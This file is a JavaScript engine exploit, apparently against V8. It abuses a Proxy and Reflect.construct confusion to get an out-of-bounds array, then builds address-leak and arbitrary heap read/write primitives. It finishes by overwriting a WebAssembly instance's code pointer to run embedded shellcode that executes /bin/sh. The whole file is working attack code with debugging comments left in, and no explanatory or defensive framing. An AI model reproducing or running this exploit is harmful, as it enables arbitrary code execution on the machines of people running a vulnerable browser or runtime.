let fi_buf = new ArrayBuffer(8);  // shared buffer
let f_buf = new Float64Array(fi_buf);  // buffer for float
let i_buf = new BigUint64Array(fi_buf);  // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}


function lower(i) { // lower 32 bits of int
        return i&BigInt(0xffffffff);
}
function upper(i){  // upper 32 bits of int
        return (i>>32n)&BigInt(0xffffffff);
}


function hex(i) {
    // Return the hex string of a value
        start = "";
        content = i.toString(16);
        return start + "0x" + content;
}

let a = [0.1, , , , , , , , , , , , , , , 0.2, 0.3, 0.4];
let oob_arr;

a.pop();
a.pop();
a.pop();

function empty() { }

function f(p) {
    a.push(Reflect.construct(function(){}, arguments, p)?4.183559238858528e-216:0);
    for (let i = 0; i < 0x10000; i++) { }
}

let p = new Proxy(Object, {
    get: () => {
        a[1] = {};
        oob_arr = [0.1];
        obj_arr = [{}];
        return Object.prototype;
    }
});

function main(p) {
    f(p);
    for (let i = 0; i < 0x10000; i++) { }
}

for (let i = 0; i < 0x10000; i++) { main(function(){}); a.pop(); }
main(empty);
main(empty);
main(p);
console.assert(oob_arr.length === 0x8000); // Achieved OOB


// // console.log(oob_arr.length);
// console.assert(oob_arr.length === 0x8000); // Achieved OOB

function oob_read32(i){
        i-=2;
        if (i%2 == 0) return lower(ftoi(oob_arr[(i>>1)]));
        else return upper(ftoi(oob_arr[(i>>1)]));
}

// function addrof(obj) {
//     obj_arr[0] = obj;
//     return ftoi(oob_arr[4]) & 0xffffffffn;
// }

// let ob = {a: 1};
// console.log(addrof(ob));

let vic_arr = new Array(128); // Victim float array
vic_arr[0] = 1.8; // 63
let obj_arrr = new Array(256); // Object array
obj_arrr[0] = {}; //461


// for (let i = 0; i < 500; i++) {
//         console.log(i);
//         console.log(hex(oob_read32(i)));
// }

console.log(hex(oob_read32(40)));
console.log(hex(oob_read32(434)));
// oob_write32(434, 0x41414141);
// console.log(hex(oob_read32(434)));
// test oob read in a loop to get the offset till 500
// for (let i = 0; i < 500; i++) {
//         console.log(i);
//         console.log(hex(ftoi(oob_arr[i])));
// }

// for (let i = 0; i < 500; i++) {
//         console.log(oob_read32[i]);
// }

// %DebugPrint(vic_arr);
// %DebugPrint(obj_arr);
// vic_arr_mapptr = oob_read32(63);
// console.log(hex(vic_arr_mapptr));
// obj_arr_mapptr = oob_read32(461);
// console.log(hex(obj_arr_mapptr));

function oob_write32(i, x){
        i-=2;
        if (i%2 == 0) oob_arr[(i>>1)] = itof( (oob_read32(i^1)<<32n) + BigInt(x));
        else oob_arr[(i>>1)] = itof( (x<<32n) + oob_read32(i^1));
}

function addrof(o) { // Get heap address of object
        obj_arrr[0] = o;
        vic_arr_mapptr = oob_read32(40);
        obj_arr_mapptr = oob_read32(434);
        oob_write32(434, vic_arr_mapptr);
        let addr = obj_arrr[0];
        oob_write32(434, obj_arr_mapptr);
        return lower(ftoi(addr));
}

// // test addrof
// let ob = {a: 1};
// console.log(hex(addrof(ob)));
// %DebugPrint(ob);

// let test2 = {};
// console.log(hex(addrof(test2)));
// %DebugPrint(test2);


let test = oob_read32(42);

function heap_read64(addr) { // Read 64 bits at arbitrary heap address
        vic_arr_elemptr = oob_read32(42);
        new_vic_arr_elemptr = (addr -0x8n + 1n);
        oob_write32(42, new_vic_arr_elemptr);
        let data = ftoi(vic_arr[0]);
        oob_write32(42, vic_arr_elemptr);
        return data;
}

// console.log(hex(heap_read64(test)));

function heap_write64(addr, val) { // Write 64 bits at arbitrary heap address
        vic_arr_elemptr = oob_read32(42);
        new_vic_arr_elemptr = (addr + -0x8n + 1n);
        oob_write32(42, new_vic_arr_elemptr);
        vic_arr[0] = itof(val);
        oob_write32(42, vic_arr_elemptr);
}

// // test heap_write64
// let test1 = oob_read32(42);
// console.log(hex(test1));
// heap_write64(test1, 0x414141414141);
// console.log(heap_read64(test1));

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,124,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,83,1,81,0,68, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68,0x00,68,214,144,0x48, 0x31, 0xF6, 0x56,0xEB, 0x07,68,0xFF, 0x35, 0xDC, 0xFF, 0xFF, 0xFF,0xEB, 0x07,68,0x54, 0x5F, 0x48, 0x31, 0xD2, 0x54,0xEB, 0x07,68,0x6A, 0x00,144, 144,144,144,0xEB, 0x07,68,0x49, 0x83, 0xEF, 0x12, 0x41, 0x57, 0xEB, 0x07,68,0x54, 0x5E ,0x6A, 0x3B,0x58, 0x99, 0x0F, 0x05,68,144, 0x48, 0x89, 0xE7, 0x99,0x0F, 0x05,204,26,26,26,26,26,26,26,11,0,10,4,110,97,109,101,2,3,1,0,0]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let addr_wasminstance = addrof(wasmInstance);
wasmoffset = 71n;

var wasmCode1 = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,124,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,13,1,11,0,68,0x41,0x41,144,144,72,137,16,195,11,0,19,4,110,97,109,101,1,7,1,0,4,109,97,105,110,2,3,1,0,0]);
var wasmModule1 = new WebAssembly.Module(wasmCode1);
var wasmInstance1 = new WebAssembly.Instance(wasmModule1, {});
let addr_wasminstance1 = addrof(wasmInstance1);
console.log(hex(addr_wasminstance1));

let wasm_rwx = heap_read64(addr_wasminstance+wasmoffset);
var f1 = wasmInstance.exports.main;
f1();
let shellcode1 = wasm_rwx+0x81cn + 0x8n + 0x8n;
console.log(hex(shellcode1));


let wasm_rwx1 = heap_read64(addr_wasminstance1+wasmoffset);
var f2 = wasmInstance1.exports.main;
heap_write64(addr_wasminstance1+wasmoffset,shellcode1);
wasm_function_offset = 0x800n;
let initial_rwx_write_at = wasm_rwx + wasm_function_offset;
console.log(hex(initial_rwx_write_at));
f2()

// Rest In Peace